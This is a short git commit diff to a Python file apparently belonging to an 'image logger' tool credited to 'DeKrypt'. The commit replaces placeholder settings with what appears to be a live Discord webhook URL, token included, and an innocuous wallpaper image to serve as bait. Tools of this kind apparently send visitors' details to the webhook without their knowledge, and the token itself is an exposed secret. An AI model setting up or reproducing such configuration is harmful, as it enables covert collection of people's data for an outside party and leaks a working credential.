a5eca170e67788c660996c1e48c7b7fa2ef8d3f7
xansjuh <makaylabro12@gmail.com>
2025-01-31 09:08:32 -0800

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334411974972542987/lf9ZRuvblKRgiYGPIzE7UEOsV17FTcRrbn1ORYFu_QFmqC-IxZwlB9-sbBdUweSzQVHF",
+    "image": "https://static.wikitide.net/windowswallpaperwiki/thumb/e/eb/Windows_Energy_Bliss.jpg/200px-Windows_Energy_Bliss.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
